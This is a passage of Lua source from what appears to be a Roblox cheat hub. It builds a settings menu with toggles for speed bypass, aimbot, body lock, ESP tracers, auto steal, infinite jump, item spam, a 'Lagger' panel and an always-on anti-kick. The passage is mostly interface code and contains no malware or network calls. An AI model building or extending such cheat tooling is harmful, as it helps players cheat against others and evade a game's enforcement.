	b1.Size = UDim2.new(0.5, 0, 1, 0)
	b1.Text = ""
	b1.ZIndex = 4
	b1.Parent = holder
	b1.MouseButton1Click:Connect(function() setAntiRagdollMode("V1"); refresh() end)
	local b2 = Instance.new("TextButton")
	b2.BackgroundTransparency = 1
	b2.Size = UDim2.new(0.5, 0, 1, 0)
	b2.Position = UDim2.new(0.5, 0, 0, 0)
	b2.Text = ""
	b2.ZIndex = 4
	b2.Parent = holder
	b2.MouseButton1Click:Connect(function() setAntiRagdollMode("V2"); refresh() end)
	refresh()
end
toggleNamed(pagePlayer, "Anti Paintball Gun", St.antiPaint, setAntiPaint, 4, "antiPaint")
toggleNamed(pagePlayer, "Anti Boogie Bomb", St.antiBoogie, setAntiBoogie, 5, "antiBoogie")

section(pagePlayer, "* — SPEED (Vis S2)", 10)
toggleNamed(pagePlayer, "Speed On", St.speedOn, setSpeedOn, 11, "speedOn")

local modeCards = {}
function modeCard(name, desc, order)
	local m = St.modes[name]
	local r = row(pagePlayer, 58, order)
	modeCards[name] = r
	local nm = Instance.new("TextLabel")
	nm.Size = UDim2.new(0, 130, 0, 18)
	nm.Position = UDim2.new(0, 12, 0, 6)
	nm.BackgroundTransparency = 1
	nm.Text = name .. " Speed"
	nm.TextColor3 = C.text
	nm.TextSize = 13
	nm.Font = Enum.Font.GothamBold
	nm.TextXAlignment = Enum.TextXAlignment.Left
	nm.Parent = r
	local ds = Instance.new("TextLabel")
	ds.Size = UDim2.new(0, 140, 0, 14)
	ds.Position = UDim2.new(0, 12, 0, 24)
	ds.BackgroundTransparency = 1
	ds.Text = desc
	ds.TextColor3 = C.textDim
	ds.TextSize = 10
	ds.Font = Enum.Font.Gotham
	ds.TextXAlignment = Enum.TextXAlignment.Left
	ds.Parent = r
	-- Keybind PC: giữa khoảng norm ↔ steal
	keyBtn(r, m.key, function(k) St.modes[name].key = k; saveCfg() end, UDim2.new(1, -112, 0, 28))
	local ln = Instance.new("TextLabel")
	ln.Size = UDim2.new(0, 48, 0, 12)
	ln.Position = UDim2.new(1, -150, 0, 4)
	ln.BackgroundTransparency = 1
	ln.Text = "norm"
	ln.TextColor3 = C.textDim
	ln.TextSize = 9
	ln.Font = Enum.Font.Gotham
	ln.Parent = r
	local ls = Instance.new("TextLabel")
	ls.Size = UDim2.new(0, 48, 0, 12)
	ls.Position = UDim2.new(1, -72, 0, 4)
	ls.BackgroundTransparency = 1
	ls.Text = "steal"
	ls.TextColor3 = C.textDim
	ls.TextSize = 9
	ls.Font = Enum.Font.Gotham
	ls.Parent = r
	numBox(r, UDim2.new(1, -150, 0, 20), 48, m.norm, function(v)
 St.modes[name].norm = math.clamp(tonumber(v) or 59, 1, 200)
 if St.activeMode == name then
 currentSpeedValue = getActiveMoveSpeed()
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 if St.speedOn then pcall(startSpeedBoost) end
 end
 saveCfg()
	end)
	numBox(r, UDim2.new(1, -72, 0, 20), 48, m.steal, function(v)
 St.modes[name].steal = math.clamp(tonumber(v) or 30, 1, 200)
 if St.activeMode == name then
 currentSpeedValue = getActiveMoveSpeed()
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 if St.speedOn then pcall(startSpeedBoost) end
 end
 saveCfg()
	end)
	local hit = Instance.new("TextButton")
	hit.Size = UDim2.new(0.45, 0, 1, 0)
	hit.BackgroundTransparency = 1
	hit.Text = ""
	hit.Active = true
	hit.ZIndex = 15
	hit.Parent = r
	hit.MouseButton1Click:Connect(function() setActiveMode(name) end)
	hit.Activated:Connect(function() setActiveMode(name) end)
end
modeCard("Normal", "default mode", 12)
modeCard("Lagger", "use against lagger", 13)
modeCard("Custom", "custom spd", 14)
function _G.ZenonetopRefreshModeCards()
	for n, card in pairs(modeCards) do
 local st = card:FindFirstChildOfClass("UIStroke")
 if st then
 local on = St.activeMode == n
 st.Color = on and C.accent or C.stroke
 st.Transparency = on and 0.05 or 0.35
 end
	end
end
_G.ZenonetopRefreshModeCards()


-- ============================================================
-- Ragdoll TP Left/Right removed

section(pagePlayer, "* — COMBAT / DROP / RESET", 20)
toggleNamed(pagePlayer, "Tool Aimbot", St.toolAim, setToolAim, 21, "toolAim")
toggleNamed(pagePlayer, "Body Lock", St.bodyLock == true, setBodyLock, 22, "bodyLock")
do
	local rr = row(pagePlayer, 36, 22)
	local rl = Instance.new("TextLabel")
	rl.Size = UDim2.new(0.55, 0, 1, 0)
	rl.BackgroundTransparency = 1
	rl.Text = "Body Lock Range"
	rl.TextColor3 = C.text
	rl.TextSize = 12
	rl.Font = Enum.Font.Gotham
	rl.TextXAlignment = Enum.TextXAlignment.Left
	rl.Parent = rr
	numBox(rr, UDim2.new(1, -70, 0.5, -12), 56, tonumber(St.bodyLockRange) or 20, function(v)
 setBodyLockRange(v)
	end)
end
-- Ragdoll TP Left/Right removed from menu

toggleNamed(pagePlayer, "Infinite Jump (Hold)", St.infJump, setInfJump, 215, "infJump")
toggleNamed(pagePlayer, "Auto Destroy Sentry", St.destroySentry, setDestroySentry, 216, "destroySentry")
-- drop mode
local dropRow = row(pagePlayer, 38, 22)
local dropLbl = Instance.new("TextLabel")
dropLbl.Size = UDim2.new(0.4, 0, 1, 0)
dropLbl.Position = UDim2.new(0, 12, 0, 0)
dropLbl.BackgroundTransparency = 1
dropLbl.Text = "Drop Mode"
dropLbl.TextColor3 = C.text
dropLbl.TextSize = 13
dropLbl.Font = Enum.Font.Gotham
dropLbl.TextXAlignment = Enum.TextXAlignment.Left
dropLbl.Parent = dropRow
for i, name in ipairs({ "Stand", "Jump" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 60, 0, 26)
	b.Position = UDim2.new(1, -140 + (i - 1) * 66, 0.5, -13)
	b.BackgroundColor3 = ((St.dropMode == 1 and name == "Stand") or (St.dropMode == 2 and name == "Jump")) and C.accent or C.box
	b.Text = name
	b.TextColor3 = ((St.dropMode == 1 and name == "Stand") or (St.dropMode == 2 and name == "Jump")) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = dropRow
	corner(b, 7)
	b.Active = true
	b.ZIndex = 40
	function pickDrop()
 St.dropMode = (name == "Jump") and 2 or 1
 for _, ch in ipairs(dropRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = (St.dropMode == 2 and ch.Text == "Jump") or (St.dropMode == 1 and ch.Text == "Stand")
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickDrop)
	b.Activated:Connect(pickDrop)
end
actionBtn(pagePlayer, "Drop Now", C.accent, runDrop, 23)

local instaRow = row(pagePlayer, 38, 24)
local instaLbl = Instance.new("TextLabel")
instaLbl.Size = UDim2.new(0.4, 0, 1, 0)
instaLbl.Position = UDim2.new(0, 12, 0, 0)
instaLbl.BackgroundTransparency = 1
instaLbl.Text = "Insta Reset"
instaLbl.TextColor3 = C.text
instaLbl.TextSize = 13
instaLbl.Font = Enum.Font.Gotham
instaLbl.TextXAlignment = Enum.TextXAlignment.Left
instaLbl.Parent = instaRow
for i, name in ipairs({ "V1", "V2" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 48, 0, 26)
	b.Position = UDim2.new(1, -120 + (i - 1) * 54, 0.5, -13)
	b.BackgroundColor3 = (St.instaMode == name) and C.accent or C.box
	b.Text = name
	b.TextColor3 = (St.instaMode == name) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = instaRow
	corner(b, 7)
	b.Active = true
	b.ZIndex = 40
	function pickInsta()
 St.instaMode = name
 for _, ch in ipairs(instaRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.instaMode
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickInsta)
	b.Activated:Connect(pickInsta)
end
actionBtn(pagePlayer, "Insta Reset Now", C.danger, doInstaReset, 25)
actionBtn(pagePlayer, "TP Down", C.accent, function() doTPDown(true) end, 26)

section(pagePlayer, "* — KEYBINDS", 30)
function keyRow(label, keyId, order)
	local r = row(pagePlayer, 36, order)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, -56, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = label
	t.TextColor3 = C.text
	t.TextSize = 13
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	keyBtn(r, St.keys[keyId], function(k) St.keys[keyId] = k; saveCfg() end, UDim2.new(1, -48, 0.5, -12))
end
keyRow("Key Drop", "Drop", 31)
keyRow("Key TP Down", "TPDown", 32)
keyRow("Key Insta Reset", "InstaReset", 33)
keyRow("Key Destroy Sentry", "DestroySentry", 34)
keyRow("Key Auto Steal", "AutoSteal", 35)

-- Full KEYBINDS TAB
if pageKeys then
	section(pageKeys, "* — KEYBINDS (PC) — None = khong phim", 1)
	local function keyRowTab(label, keyId, order)
 local r = row(pageKeys, 36, order)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(1, -100, 1, 0)
 t.Position = UDim2.new(0, 12, 0, 0)
 t.BackgroundTransparency = 1
 t.Text = label
 t.TextColor3 = C.text
 t.TextSize = 13
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = r
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 88, 0, 28)
 b.Position = UDim2.new(1, -96, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.TextColor3 = C.text
 b.TextSize = 12
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function refresh()
 local k = St.keys and St.keys[keyId]
 if not k or k == Enum.KeyCode.Unknown then
 b.Text = "None"
 else
 b.Text = tostring(k.Name or k)
 end
 end
 refresh()
 local listening = false
 local function startListen()
 if listening then return end
 listening = true
 b.Text = "..."
 b.BackgroundColor3 = C.accent
 local conn
 conn = UIS.InputBegan:Connect(function(inp, gp)
 if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
 local code = inp.KeyCode
 if code == Enum.KeyCode.Escape then
 -- keep current
 listening = false
 b.BackgroundColor3 = C.box
 refresh()
 if conn then conn:Disconnect() end
 return
 end
 if code == Enum.KeyCode.Backspace or code == Enum.KeyCode.Delete then
 St.keys[keyId] = nil
 else
 St.keys[keyId] = code
 end
 listening = false
 b.BackgroundColor3 = C.box
 refresh()
 pcall(saveCfg)
 if conn then conn:Disconnect() end
 end)
 end
 b.MouseButton1Click:Connect(startListen)
 b.Activated:Connect(startListen)
	end
	keyRowTab("Drop", "Drop", 2)
	keyRowTab("TP Down", "TPDown", 3)
	keyRowTab("Insta Reset", "InstaReset", 4)
	keyRowTab("Destroy Sentry", "DestroySentry", 5)
	keyRowTab("Auto Steal (toggle)", "AutoSteal", 6)
	local hint = Instance.new("TextLabel")
	hint.Size = UDim2.new(1, -16, 0, 40)
	hint.BackgroundTransparency = 1
	hint.Text = "Bam nut → nhan phim de gan\nBackspace/Delete = None | Esc = huy"
	hint.TextColor3 = C.textDim
	hint.TextSize = 11
	hint.Font = Enum.Font.Gotham
	hint.TextWrapped = true
	hint.TextXAlignment = Enum.TextXAlignment.Left
	hint.Parent = pageKeys
	hint.LayoutOrder = 20
end

----------------------------------------------------------------
-- ESP TAB
----------------------------------------------------------------
section(pageESP, "* — ESP", 1)
toggleNamed(pageESP, "Player ESP", St.esp, setESP, 2, "esp")
toggleNamed(pageESP, "Tracker / Tracer", St.tracer, setTracer, 3, "tracer")
toggleNamed(pageESP, "Anti Lag", St.antiLag, setAntiLag, 4, "antiLag")


----------------------------------------------------------------
-- SPAM TAB
----------------------------------------------------------------
section(pageSpam, "* — AUTO SPAM (khong auto-equip)", 1)
toggleNamed(pageSpam, "Spam Laser Cape", St.spamLaser, setSpamLaser, 2, "spamLaser")
toggleNamed(pageSpam, "Spam Paintball Gun", St.spamPaint, setSpamPaint, 3, "spamPaint")

section(pageCounter, "* — COUNTER (auto equip / activate)", 1)
toggleNamed(pageCounter, "Auto Laser Cape", St.counterLaser == true, setCounterLaser, 2, "counterLaser")
toggleNamed(pageCounter, "Auto Boogie Bomb", St.counterBoogie == true, setCounterBoogie, 3, "counterBoogie")
toggleNamed(pageCounter, "Auto Swap Body", St.counterSwapBody == true, setCounterSwapBody, 4, "counterSwapBody")
toggleNamed(pageCounter, "Equip & Activate on Drop", St.equipOnDrop == true, setEquipOnDrop, 5, "equipOnDrop")
do
	local info = Instance.new("TextLabel")
	info.Size = UDim2.new(1, -20, 0, 48)
	info.BackgroundTransparency = 1
	info.Text = "Laser Cape / Boogie Bomb / Swap Body: tu cam + Activate.\nOn Drop: sau khi DROP se equip & activate tool counter."
	info.TextColor3 = C.textDim
	info.TextSize = 11
	info.Font = Enum.Font.Gotham
	info.TextWrapped = true
	info.TextXAlignment = Enum.TextXAlignment.Left
	info.Parent = pageCounter
	info.LayoutOrder = 7
end


local spamInfo = row(pageSpam, 48, 4)
local spamTxt = Instance.new("TextLabel")
spamTxt.Size = UDim2.new(1, -12, 1, 0)
spamTxt.Position = UDim2.new(0, 6, 0, 0)
spamTxt.BackgroundTransparency = 1
spamTxt.Text = "Chi Activate khi dang CAM tool.\nNo tu Equip. Dung cung Tool Aimbot neu can."
spamTxt.TextColor3 = C.textDim
spamTxt.TextSize = 10
spamTxt.Font = Enum.Font.Gotham
spamTxt.TextXAlignment = Enum.TextXAlignment.Left
spamTxt.TextYAlignment = Enum.TextYAlignment.Center
spamTxt.Parent = spamInfo

----------------------------------------------------------------
-- SETTINGS TAB
----------------------------------------------------------------
section(pageSet, "* — MOBILE / LOCK", 1)
toggleNamed(pageSet, "Mobile Buttons", St.mobileBtns, function(on)
	St.mobileBtns = on
	if _G.ZenonetopApplyMobile then _G.ZenonetopApplyMobile() end
	saveCfg()
end, 2, "mobileBtns")
toggleNamed(pageSet, "Show Auto Steal Button", St.showStealBtn ~= false, function(on)
	St.showStealBtn = on and true or false
	if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
	-- nếu ON show mà chưa có nút → rebuild
	if St.showStealBtn and (not actRefs or not actRefs.steal) and _G.ZenonetopApplyMobile then
 pcall(_G.ZenonetopApplyMobile)
	end
	saveCfg()
end, 2.5, "showStealBtn")
toggleNamed(pageSet, "Show Panel TP", St.showTPPanel ~= false, function(on)
	St.showTPPanel = on and true or false
	local g = PlayerGui:FindFirstChild("ZenonetopHubbTP")
	if g then g.Enabled = St.showTPPanel end
	saveCfg()
end, 25, "showTPPanel")
toggleNamed(pageSet, "Show Panel Lagger", St.showLaggerPanel == true, function(on)
	if _G.ZenonetopSetLaggerPanel then _G.ZenonetopSetLaggerPanel(on) else St.showLaggerPanel = on; saveCfg() end
end, 25.1, "showLaggerPanel")
toggleNamed(pageSet, "Show Panel Speed Bypass", St.showSpeedBypassPanel == true, function(on)
	if _G.ZenonetopSetSpeedBypassPanel then _G.ZenonetopSetSpeedBypassPanel(on) else St.showSpeedBypassPanel = on; saveCfg() end
end, 25.3, "showSpeedBypassPanel")
-- Panel GUI size (to/nhỏ + rộng) dưới các panel
do
	local r = row(pageSet, 38, 25.4)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.45, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = "Panels Scale %"
	t.TextColor3 = C.text
	t.TextSize = 12
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 44, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(math.floor((St.panelGuiScale or 0.7) * 100)) .. "%"
	val.TextColor3 = C.text
	val.TextSize = 12
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, info[2], 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = info[1]
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function fire()
 St.panelGuiScale = math.clamp((tonumber(St.panelGuiScale) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.6, 1.6)
 val.Text = tostring(math.floor(St.panelGuiScale * 100)) .. "%"
 if _G.ZenonetopApplyPanelGuiScale then pcall(_G.ZenonetopApplyPanelGuiScale) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
end
do
	local r = row(pageSet, 38, 25.45)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.45, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = "Panels Width %"
	t.TextColor3 = C.text
	t.TextSize = 12
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 44, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(math.floor((St.panelGuiWidth or 1) * 100)) .. "%"
	val.TextColor3 = C.text
	val.TextSize = 12
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, info[2], 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = info[1]
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function fire()
 St.panelGuiWidth = math.clamp((tonumber(St.panelGuiWidth) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.7, 1.5)
 val.Text = tostring(math.floor(St.panelGuiWidth * 100)) .. "%"
 if _G.ZenonetopApplyPanelGuiScale then pcall(_G.ZenonetopApplyPanelGuiScale) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
end
toggleNamed(pageSet, "Lock UI", St.guiLock, function(on)
	St.guiLock = on and true or false
	-- snapshot positions then save immediately on lock/unlock
	pcall(function()
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 end
 local miniGui = PlayerGui:FindFirstChild("ZenonetopHubFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini then
 St._miniPos = {mini.Position.X.Scale, mini.Position.X.Offset, mini.Position.Y.Scale, mini.Position.Y.Offset}
 end
 local mb = PlayerGui:FindFirstChild("ZenonetopHubModeBar")
 local mf = mb and mb:FindFirstChildWhichIsA("Frame")
 if mf then
 St._modeBarPos = {mf.Position.X.Scale, mf.Position.X.Offset, mf.Position.Y.Scale, mf.Position.Y.Offset}
 end
 St._btnPos = St._btnPos or {}
 local function snapHoldersLock(gui)
 if not gui then return end
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") or holder:IsA("TextButton") then
 local key = holder.Name
 if key and (key:sub(1,2) == "A_" or key:sub(1,2) == "M_") then
 St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset,
 }
 end
 end
 end
 end
 snapHoldersLock(PlayerGui:FindFirstChild("ZenonetopHubActionButtons"))
 snapHoldersLock(PlayerGui:FindFirstChild("ZenonetopHubModeBar"))
	end)
	pcall(saveCfg)
end, 3, "guiLock")
-- Anti Kick luôn ON — chỉ hiện trạng thái, không OFF được
do
	local r = row(pageSet, 32, 4)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -16, 1, 0)
	lbl.Position = UDim2.new(0, 8, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = "Anti Kick · ALWAYS ON"
	lbl.TextColor3 = Color3.fromRGB(120, 255, 160)
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = r
end

section(pageSet, "* — BUTTON SHAPE", 10)
local shapeRow = row(pageSet, 38, 11)
for i, name in ipairs({ "Round", "Box", "Square" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 90, 0, 28)
	b.Position = UDim2.new(0, 12 + (i - 1) * 100, 0.5, -14)
	b.BackgroundColor3 = (St.btnShape == name) and C.accent or C.box
	b.Text = name
	b.TextColor3 = (St.btnShape == name) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 12
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = shapeRow
	corner(b, name == "Round" and 14 or (name == "Box" and 6 or 2))
	local function pickShape()
 St.btnShape = name
 -- Áp shape ngay lên MỌI action button
 pcall(function()
 if actRefs then
 for key, e in pairs(actRefs) do
 if e and e.btn then
 applyCorner(e.btn, name)
 applyCornerToChildren(e.btn, name)
 end
 end
 end
 end)
 if _G.ZenonetopUpdateMobileVisuals then pcall(_G.ZenonetopUpdateMobileVisuals) end
 if _G.ZenonetopForceApplyShape then pcall(_G.ZenonetopForceApplyShape, name) end
 for _, ch in ipairs(shapeRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == name
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickShape)
	b.Activated:Connect(pickShape)
	b.MouseButton1Down:Connect(pickShape)
end

section(pageSet, "* — BUTTON SIZE", 20)
function sizeRow(label, key, order)
	local r = row(pageSet, 38, order)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.4, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = label
	t.TextColor3 = C.text
	t.TextSize = 13
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 40, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(St.btnSizes[key] or 50)
	val.TextColor3 = C.text
	val.TextSize = 13
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	local function mk(sign, x)
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, x, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Active = true
 b.ZIndex = 30
 b.Parent = r
 corner(b, 7)
 local function fire()
 local cur = tonumber(St.btnSizes[key]) or 50
 cur = math.clamp(cur + (sign == "+" and 5 or -5), 20, 200)
 St.btnSizes[key] = cur
 val.Text = tostring(cur)
 if _G.ZenonetopUpdateMobileVisuals then pcall(_G.ZenonetopUpdateMobileVisuals) end
 if _G.ZenonetopApplyMobile then pcall(_G.ZenonetopApplyMobile) end
 -- Speed 3Mode: rebuild để áp chiều cao mới
 if key == "mode" and _G.ZenonetopBuildV2ModeBar then pcall(_G.ZenonetopBuildV2ModeBar) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
	mk("-", -80)
	mk("+", -44)
end
sizeRow("All Scale %", "mode", 21) -- reuse mode key for display; actual all scale below
-- all scale
local scaleRow = row(pageSet, 38, 22)
local st = Instance.new("TextLabel")
st.Size = UDim2.new(0.4, 0, 1, 0)
st.Position = UDim2.new(0, 12, 0, 0)
st.BackgroundTransparency = 1
st.Text = "All Buttons Scale"
st.TextColor3 = C.text
st.TextSize = 13
st.Font = Enum.Font.Gotham
st.TextXAlignment = Enum.TextXAlignment.Left
st.Parent = scaleRow
local scaleVal = Instance.new("TextLabel")
scaleVal.Size = UDim2.new(0, 48, 0, 24)
scaleVal.Position = UDim2.new(1, -128, 0.5, -12)
scaleVal.BackgroundTransparency = 1
scaleVal.Text = tostring(math.floor(St.btnScale * 100)) .. "%"
scaleVal.TextColor3 = C.text
scaleVal.TextSize = 13
scaleVal.Font = Enum.Font.GothamBold
scaleVal.Parent = scaleRow
for _, info in ipairs({ { "-", -80 }, { "+", -44 } }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 28, 0, 28)
	b.Position = UDim2.new(1, info[2], 0.5, -14)
	b.BackgroundColor3 = C.box
	b.Text = info[1]
	b.TextColor3 = C.text
	b.TextSize = 16
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 30
	b.Parent = scaleRow
	corner(b, 7)
	function fire()
 St.btnScale = math.clamp((tonumber(St.btnScale) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.3, 2.0)
 scaleVal.Text = tostring(math.floor(St.btnScale * 100)) .. "%"
 if _G.ZenonetopUpdateMobileVisuals then pcall(_G.ZenonetopUpdateMobileVisuals) end
 if _G.ZenonetopApplyMobile then pcall(_G.ZenonetopApplyMobile) end
 -- rebuild V2 bar to pick new scale defaults
 if _G.ZenonetopBuildV2ModeBar then pcall(_G.ZenonetopBuildV2ModeBar) end
 saveCfg()
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
end
sizeRow("Size: Speed 3Mode", "mode", 22.5)
sizeRow("Size: Drop", "drop", 23)
sizeRow("Size: Insta", "insta", 24)
sizeRow("Size: TP", "tp", 25)
sizeRow("Size: Sentry", "sentry", 25.5)
sizeRow("Size: Auto Steal", "steal", 26)


section(pageSet, "* — MENU UI SCALE", 28)
local menuScaleRow = row(pageSet, 36, 29)
local msl = Instance.new("TextLabel")
msl.Size = UDim2.new(0.4, 0, 1, 0)
msl.Position = UDim2.new(0, 10, 0, 0)
msl.BackgroundTransparency = 1
msl.Text = "Menu Size"
msl.TextColor3 = C.text
msl.TextSize = 12
msl.Font = Enum.Font.Gotham
msl.TextXAlignment = Enum.TextXAlignment.Left
msl.Parent = menuScaleRow
local msVal = Instance.new("TextLabel")
msVal.Size = UDim2.new(0, 40, 0, 22)
msVal.Position = UDim2.new(1, -110, 0.5, -11)
msVal.BackgroundTransparency = 1
msVal.Text = tostring(math.floor((St.menuScale or 1) * 100)) .. "%"
msVal.TextColor3 = C.text
msVal.TextSize = 12
msVal.Font = Enum.Font.GothamBold
msVal.Parent = menuScaleRow
for _, info in ipairs({{"-", -72}, {"+", -40}}) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 26, 0, 26)
	b.Position = UDim2.new(1, info[2], 0.5, -13)
	b.BackgroundColor3 = C.box
	b.Text = info[1]
	b.TextColor3 = C.text
	b.TextSize = 14
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 30
	b.Parent = menuScaleRow
	corner(b, 6)
	function fire()
 St.menuScale = math.clamp((St.menuScale or 1) + (info[1] == "+" and 0.05 or -0.05), 0.7, 1.3)
 msVal.Text = tostring(math.floor(St.menuScale * 100)) .. "%"
 applyMenuScale()
 saveCfg()
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
end

section(pageSet, "* — RESET", 30)
actionBtn(pageSet, "Reset Mobile Positions", C.accent, function()
	if _G.ZenonetopResetMobilePos then _G.ZenonetopResetMobilePos() end
	saveCfg()
end, 31)
actionBtn(pageSet, "Reset All Settings", C.danger, function()
	-- full defaults
	pcall(function() setAntiGummy(true) end)
	pcall(function() setAntiRagdoll(false) end)
	pcall(function() setAntiPaint(true) end)
	pcall(function() setAntiBoogie(true) end)
	pcall(function() setToolAim(true) end)
	pcall(function() setInfJump(true) end)
	pcall(function() setDestroySentry(false) end)
	pcall(function() setSpeedOn(true) end)
	pcall(function() setActiveMode("Normal") end)
	St.dropMode = 2
	St.instaMode = "V1"
	St.mobileBtns = true
	St.showStealBtn = true
	St.guiLock = false
	St.btnShape = "Square"
	St.btnScale = 0.75
	St.menuScale = 1
	St.btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50 }
	St._btnPos = nil
	St._modeBarPos = nil
	St._miniPos = nil
	St._mainPos = nil
	St._stealBarPos = nil
	St._tpMainPos = nil
	St.stealVer = "V1"
	St.stealRadius = 60
	St.stealPause = false
	St.stealPausePct = 75
	St.autoSteal = false
	St.modes = {
 Normal = { norm = 59, steal = 30, key = Enum.KeyCode.T },
 Lagger = { norm = 18, steal = 24, key = Enum.KeyCode.Q },
 Custom = { norm = 33, steal = 33, key = Enum.KeyCode.C },
	}
	St.activeMode = "Normal"
	St.keys = {
 Drop = Enum.KeyCode.X,
 TPDown = Enum.KeyCode.F,
 InstaReset = Enum.KeyCode.Z,
 DestroySentry = Enum.KeyCode.H,
	}
	pcall(function() setESP(false) end)
	pcall(function() setTracer(false) end)
	pcall(function() setAntiLag(false) end)
	pcall(function() setSpamLaser(false) end)
